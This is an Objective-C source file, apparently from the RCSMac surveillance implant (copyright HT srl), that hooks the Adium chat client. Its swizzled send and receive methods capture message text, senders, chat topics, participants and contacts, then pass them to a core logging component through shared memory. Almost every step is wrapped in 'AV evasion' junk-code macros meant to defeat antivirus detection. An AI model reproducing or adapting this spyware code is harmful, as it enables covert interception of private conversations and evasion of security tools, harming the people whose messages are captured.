//
//  RCSMAgentIMAdium.m
//  RCSMac
//
//  Created by Guido on 2/16/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import <objc/runtime.h>

#import "RCSMInputManager.h"
#import "RCSMAgentIMAdium.h"
#import "RCSMAgentOrganizer.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"
 
#import "RCSMAVGarbage.h"

static BOOL gAdiumContactGrabbed = NO;

void logAdiumContacts(NSString *contact)
{
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *firstData   = [@"Adium" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  NSData *contactData = [contact dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *abData       = [[NSMutableData alloc] init];
  
  u_int tag = 0x1 << 24; // firstName
  tag |= ([firstData length] & 0x00FFFFFF);
  
  [abData appendBytes:&tag length:sizeof(u_int)];
  
  [abData appendData:firstData];
  tag = 0x6 << 24; // email address
  tag |= ([contactData length] & 0x00FFFFFF);
  
  [abData appendBytes:&tag length:sizeof(u_int)];
  [abData appendData:contactData];
  
  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  additionalHeader->size    = sizeof(organizerAdditionalHeader) + [abData length];
  additionalHeader->version = CONTACT_LOG_VERSION_NEW;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  additionalHeader->identifier  = 0;
  additionalHeader->program     = 0x07; // whatsapp contact
  additionalHeader->flags       = 0x80000000; // non local (local = 0x80000000)
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  [entryData appendData:logHeader];
  [entryData appendData:abData];
  
  [logHeader release];
  [abData release];
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT_CONTACT;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData release];
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
  {
#ifdef DEBUG_IM_SKYPE
    verboseLog(@"message: %@", loggedText);
#endif
  }
  else
  {
#ifdef DEBUG_IM_SKYPE
    errorLog(@"Error while logging skype message to shared memory");
#endif
  }
  
  [logData release];
  
  gAdiumContactGrabbed = TRUE;
}

void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSString *_message, uint32 flags)
{
  int programType = 0x08; // adiumx
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSData *topic               = [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_message dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  short unicodeNullTerminator = 0x0000;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Program type
  [entryData appendBytes:&programType length:sizeof(programType)];
  
  // flags
  [entryData appendBytes:&flags length:sizeof(flags)];
    
  // Topic
  [entryData appendData: topic];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic_display
  [entryData appendData: topic];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Peers
  [entryData appendData: peers];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers_display
  [entryData appendData: peers];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData appendData: content];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  shMemoryHeader->agentID         = AGENT_CHAT_NEW;
  shMemoryHeader->direction       = D_TO_CORE;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_IM_ADIUM
      verboseLog(@"message: %@", _message);
#endif
    }
  else
    {
#ifdef DEBUG_IM_ADIUM
      errorLog(@"Error while logging skype message to shared memory");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [logData release];
  [entryData release];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
}

void adiumHookWrapper(id arg1, NSUInteger direction)
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([arg1 respondsToSelector: @selector(message)] &&
      [arg1 respondsToSelector: @selector(type)] &&
      [arg1 respondsToSelector: @selector(source)] &&
      [arg1 respondsToSelector: @selector(chat)])
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      NSString *topic;
      NSString *msgType = [arg1 performSelector: @selector(type)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      NSUInteger msgLen = [[arg1 performSelector: @selector(message)] length];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if (msgLen && [msgType isEqualToString: @"Message"] == YES)
        { 
          NSString *msgBuf  = [[arg1 performSelector: @selector(message)] string];
          NSString *src     = [[arg1 performSelector: @selector(source)] performSelector: @selector(displayName)];

          id chat   = [arg1 performSelector: @selector(chat)];
#ifdef DEBUG_IM_ADIUM
          infoLog(@"%@ message of type: %@, len: %d, supportsTopic: %d, isGroupChat: %d, msg:%@",
                direction==ADIUM_MSG_RECEIVE?@"Received":@"Sent",
                msgType,
                msgLen,
                [chat performSelector: @selector(supportsTopic)],
                [chat performSelector: @selector(isGroupChat)],
                msgBuf);
#endif
          // topic
          if ([chat performSelector: @selector(supportsTopic)] != 0)
            topic = [chat performSelector: @selector(topic)];
          else
            topic = @"-";

          // peers
          NSMutableString *activeMembers  = [[NSMutableString alloc] init];
          if ([chat performSelector: @selector(isGroupChat)] != 0)
            {
              
              // AV evasion: only on release build
              AV_GARBAGE_006
              
              for (NSString *alias in [chat performSelector: @selector(containedObjects)])
                {
                  [activeMembers appendString: [alias performSelector: @selector(ownDisplayName)]];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_001
                  
                  [activeMembers appendString: @", "];
                }
              
              // AV evasion: only on release build
              AV_GARBAGE_005
              
              [activeMembers replaceCharactersInRange: NSMakeRange([activeMembers length] - 2, 2)
                                           withString: @""];
              
              // AV evasion: only on release build
              AV_GARBAGE_007              
            }
          else
            {
              [activeMembers appendString: src];
              
              // AV evasion: only on release build
              AV_GARBAGE_000
              
              [activeMembers appendString: @", "];
              
              // AV evasion: only on release build
              AV_GARBAGE_008
              
              [activeMembers appendString: 
                   [[arg1 performSelector: @selector(destination)] performSelector: @selector(displayName)]];
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          if (gAdiumContactGrabbed == FALSE)
            logAdiumContacts(src);
          
          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf, direction);
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          [activeMembers release];
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [outerPool release];
}

@implementation myAIContentController

- (void)myfinishSendContentObject: (id)arg1
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  adiumHookWrapper(arg1, ADIUM_MSG_SEND);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [self myfinishSendContentObject: arg1];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
}

- (void)myfinishReceiveContentObject: (id)arg1
{
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  adiumHookWrapper(arg1, ADIUM_MSG_RECEIVE);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [self myfinishReceiveContentObject: arg1];  
  
  // AV evasion: only on release build
  AV_GARBAGE_005
}

@end
